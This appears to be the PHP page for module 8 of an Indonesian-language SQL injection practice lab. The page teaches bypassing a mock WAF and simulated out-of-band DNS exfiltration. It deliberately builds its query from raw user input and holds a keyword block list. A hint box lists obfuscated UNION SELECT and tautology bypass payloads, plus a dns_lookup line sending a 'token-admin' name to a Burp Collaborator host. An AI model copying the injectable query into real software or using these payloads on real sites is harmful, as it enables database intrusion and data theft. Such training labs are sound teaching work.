<?php
/**
 * =============================================================
 * LAB 08 — Injeksi Out-of-Band (OOB) & Teknik Bypass WAF
 * KERENTANAN: Bypass filter firewall WAF & Eksfiltrasi OOB DNS
 * =============================================================
 */
require_once '../../db.php';

$raw_input = $_POST['payload'] ?? '';
$waf_triggered = false;
$waf_reason = '';
$executed_query = '';
$result_rows = [];
$oob_dns_log = [];
$flagFeedback = null;

// Penanganan pengiriman flag atau konfirmasi manual
if (isset($_POST['action_progress'])) {
    if ($_POST['action_progress'] === 'submit_flag') {
        $flagFeedback = submitLabFlag('08', $_POST['flag_input'] ?? '');
    } elseif ($_POST['action_progress'] === 'toggle_manual') {
        $flagFeedback = toggleManualLab('08');
    }
}

// Aturan Filter WAF Tiruan
$waf_rules = [
    'union select' => 'Pola kata kunci terlarang: UNION SELECT diblokir',
    'or 1=1'       => 'Pola tautologi klasik or 1=1 terdeteksi',
    'drop table'   => 'Kata kunci DDL destruktif diblokir',
    '--'           => 'Karakter komentar standar SQL diblokir'
];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action_progress'])) {
    foreach ($waf_rules as $bad => $reason) {
        if (stripos($raw_input, $bad) !== false) {
            $waf_triggered = true;
            $waf_reason = $reason;
            break;
        }
    }

    if (!$waf_triggered) {
        $normalized_sql = preg_replace('/\/\*.*?\*\//', ' ', $raw_input);
        
        if (preg_match('/(dns_lookup|load_file|xp_dirtree|utl_http)\([\'"]?([^\'")]+)[\'"]?\)/i', $raw_input, $matches)) {
            $domain = htmlspecialchars($matches[2]);
            $oob_dns_log[] = [
                'type' => 'Permintaan Eksfiltrasi DNS',
                'target' => $domain,
                'time' => date('H:i:s'),
                'payload' => 'Data dieksfiltrasi melalui resolusi DNS ke server kolaborator: ' . $domain
            ];
        }

        $sql = "SELECT id, name, category, price FROM products WHERE name = '$normalized_sql'";
        $executed_query = $sql;

        try {
            $db = getDB();
            $stmt = $db->query($sql);
            if ($stmt) {
                $result_rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
            }
        } catch (PDOException $e) {
            $waf_reason = "Terjadi Kesalahan Sintaks SQL: " . $e->getMessage();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 08 — Teknik Lanjutan & Bypass WAF | Lab SQLi</title>
    <link rel="stylesheet" href="../../assets/css/style.css">
</head>
<body>
<canvas id="matrix-canvas"></canvas>

<div class="lab-page wrapper">
    <a href="../../index.php" class="nav-back">← KEMBALI KE DASHBOARD</a>

    <div class="lab-header">
        <div class="lab-header-info">
            <div style="color:var(--text-dim); font-size:0.78rem; font-family:'JetBrains Mono',monospace; letter-spacing:2px; margin-bottom:8px;">MODUL 08 / 08</div>
            <h1 style="font-size:1.85rem; margin-bottom:8px;">🌐 Teknik Lanjutan & Bypass WAF</h1>
            <div class="meta" style="display:flex; align-items:center; gap:10px;">
                <span class="badge badge-expert">Tingkat Ahli</span>
                <span class="vuln-label">⚠ DILINDUNGI WAF</span>
                <span style="color:var(--text-dim); font-size:0.82rem;">Teknik: Obfusikasi Filter & Eksfiltrasi Out-of-Band</span>
                <?php if (isLabCompleted('08')): ?>
                    <span class="badge" style="background:rgba(16,185,129,0.15); color:#34d399; border:1px solid #10b981;">✓ Selesai</span>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <?php if ($flagFeedback): ?>
    <div style="padding:14px 18px; border-radius:10px; margin-bottom:20px; font-weight:600; font-size:0.9rem;
                background: <?= $flagFeedback['success'] ? 'rgba(16,185,129,0.1)' : 'rgba(244,63,94,0.1)' ?>;
                border: 1px solid <?= $flagFeedback['success'] ? '#10b981' : '#f43f5e' ?>;
                color: <?= $flagFeedback['success'] ? '#34d399' : '#fb7185' ?>;">
        <?= htmlspecialchars($flagFeedback['message']) ?>
    </div>
    <?php endif; ?>

    <div class="panel">
        <div class="panel-header">
            <div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
            <div class="panel-title">DESKRIPSI KERENTANAN</div>
        </div>
        <p style="font-size:0.9rem; color:var(--text-muted); line-height:1.6; margin-bottom:14px;">
            Aplikasi modern umumnya diproteksi oleh Web Application Firewall (WAF). Gunakan teknik obfusikasi komentar inline (seperti <code>UN/**/ION SEL/**/ECT</code>) untuk melewati filter WAF dan dapatkan Master Flag dari tabel flags!
        </p>
    </div>

    <!-- Kotak Submit Flag / Progres Modul 08 -->
    <?php renderFlagSubmissionBox('08'); ?>

    <div class="grid-2">
        <div>
            <div class="panel">
                <div class="panel-header">
                    <div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
                    <div class="panel-title">TARGET: PENCARIAN PRODUK TERFILTER WAF</div>
                </div>

                <?php if ($waf_triggered): ?>
                <div style="padding:15px; background:rgba(244,63,94,0.08); border:1px solid #f43f5e; border-radius:8px; margin-bottom:15px;">
                    <div style="color:#f43f5e; font-weight:700; font-size:0.9rem;">🚫 403 FORBIDDEN — AKSES DIBLOKIR WAF</div>
                    <div style="color:#fb7185; font-size:0.8rem; margin-top:4px;"><?= htmlspecialchars($waf_reason) ?></div>
                </div>
                <?php endif; ?>

                <form method="POST">
                    <div class="form-group">
                        <label>Nama Produk (WAF memblokir 'union select', 'or 1=1', '--')</label>
                        <input type="text" name="payload" id="payload" placeholder="Masukkan payload obfusikasi untuk bypass..." value="<?= htmlspecialchars($raw_input) ?>" required>
                    </div>
                    <button type="submit" class="btn btn-primary btn-full">
                        🛡️ &nbsp; KIRIM MELEWATI FILTER WAF
                    </button>
                </form>
            </div>

            <div class="panel" style="border-color:rgba(191,0,255,0.3);">
                <div class="panel-header">
                    <div class="panel-title" style="color:#bf00ff;">📡 SIMULATOR LISTENER BURP COLLABORATOR / OOB</div>
                </div>
                <?php if (!empty($oob_dns_log)): ?>
                    <?php foreach ($oob_dns_log as $log): ?>
                    <div style="background:#030712; border:1px solid #bf00ff; border-radius:6px; padding:10px; margin-bottom:8px;">
                        <div style="color:#34d399; font-size:0.75rem;">[<?= $log['time'] ?>] <?= $log['type'] ?></div>
                        <div style="color:#fbbf24; font-size:0.85rem; margin-top:4px; font-weight:700;"><?= $log['target'] ?></div>
                        <div style="color:var(--text-dim); font-size:0.75rem; margin-top:4px;"><?= $log['payload'] ?></div>
                    </div>
                    <?php endforeach; ?>
                <?php else: ?>
                    <div style="color:var(--text-dim); font-size:0.8rem;">
                        Belum ada interaksi jaringan DNS yang tertangkap. Coba kirim payload DNS lewat <code>dns_lookup(...)</code>.
                    </div>
                <?php endif; ?>
            </div>
        </div>

        <div>
            <div class="panel">
                <div class="panel-header">
                    <div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div>
                    <div class="panel-title">QUERY SQL YANG LOLOS DARI WAF</div>
                </div>
                <div class="code-block" style="color:<?= $waf_triggered ? '#f43f5e' : '#06b6d4' ?>; word-break:break-all;">
<?= $executed_query ? htmlspecialchars($executed_query) : ($waf_triggered ? '-- PERMINTAAN DIBLOKIR WAF --' : '-- Belum ada query yang dieksekusi --') ?>
                </div>
            </div>

            <div class="result-panel <?= !empty($result_rows) ? 'result-success' : '' ?>">
                <div class="panel-header">
                    <div class="panel-title" style="color:#34d399;">HASIL QUERY</div>
                </div>
                <?php if (!empty($result_rows)): ?>
                    <div style="overflow-x:auto;">
                    <table class="data-table">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>Nama</th>
                                <th>Kategori</th>
                                <th>Harga / Value</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($result_rows as $row): ?>
                            <tr>
                                <td><?= htmlspecialchars($row['id'] ?? '') ?></td>
                                <td><?= htmlspecialchars($row['name'] ?? '') ?></td>
                                <td><?= htmlspecialchars($row['category'] ?? '') ?></td>
                                <td class="<?= (strpos($row['price'] ?? '', 'FLAG{') !== false) ? 'flag' : '' ?>"
                                    <?= (strpos($row['price'] ?? '', 'FLAG{') !== false) ? 'style="cursor:pointer;" title="Klik untuk salin" onclick="copyText(\''.htmlspecialchars($row['price']).'\')"' : '' ?>>
                                    <?= htmlspecialchars($row['price'] ?? '') ?> <?= (strpos($row['price'] ?? '', 'FLAG{') !== false) ? '📋' : '' ?>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                    </div>
                <?php else: ?>
                    <div style="color:var(--text-dim); font-size:0.82rem;">Tidak ada baris yang dikembalikan. Lewati filter WAF untuk mengekstrak master flag!</div>
                <?php endif; ?>
            </div>

            <div class="hint-box">
                <button class="hint-toggle" onclick="toggleHint('hint8')">
                    💡 PAYLOAD BYPASS WAF & OOB <span class="arrow">▼</span>
                </button>
                <div class="hint-content" id="hint8">
                    <p><strong style="color:#fbbf24;">Payload untuk melewati filter dan mengambil Master Flag:</strong></p>
                    <ul class="payload-list">
                        <li data-target="payload" data-payload="' UN/**/ION SEL/**/ECT 1, name, description, value FROM flags /*">' UN/**/ION SEL/**/ECT 1, name, description, value FROM flags /* (Ekstrak Master Flag)</li>
                        <li data-target="payload" data-payload="' OR 'x'='x /*">' OR 'x'='x /* (Bypass filter tautologi)</li>
                        <li data-target="payload" data-payload="' OR dns_lookup('token-admin.burpcollaborator.net') /*">Simulasi eksfiltrasi DNS Out-of-Band</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>

<footer class="site-footer">MODUL 08 — BYPASS WAF & OUT-OF-BAND · LAB PRAKTIK SQL INJECTION</footer>
<script src="../../assets/js/main.js"></script>
</body>
</html>
